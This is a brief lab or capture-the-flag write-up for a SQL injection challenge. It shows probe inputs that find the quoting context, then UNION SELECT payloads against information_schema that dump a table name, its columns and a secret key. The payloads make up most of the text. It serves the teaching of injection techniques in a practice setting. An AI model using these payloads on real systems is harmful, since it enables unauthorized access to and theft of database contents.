## Challenge - 3

This challenge is similar to the previous two challenges and we have 14 tries to dump the secret key

### Initial Analysis

Here also we have to find  how the developer has given the query so we try giving id the values

```sql
0' or 1=1 --+

0" or 1=1 --+

0) or 1=1 --+
```

which doesn't give any output and id=

```sql
0') or 1=1 --+
```

gives an output which means the query should be like

```sql
select login_name,password from table_name where id=('input') 
```

### Solving

Now we can find table name like in the previous problem using

```sql
0') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES'; --+
```

which gives us the table name :

**g3xh31tkpv**

Now we can find the columns in the table using 

```sql
0') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='g3xh31tkpv' and table_schema='CHALLENGES'; --+
```

we get 4 column names:

**id,sessid,secret_WP9T,tryy**

The secret key can be in any of these columns but we can always go for the most suspicious one and print the secret key using:

```sql
0') union select 1,2,group_concat(secret_WP9T) from g3xh31tkpv; --+
```

We get the secret key:

**fC3cDPza7ljnkhuhIHAlDw6o**

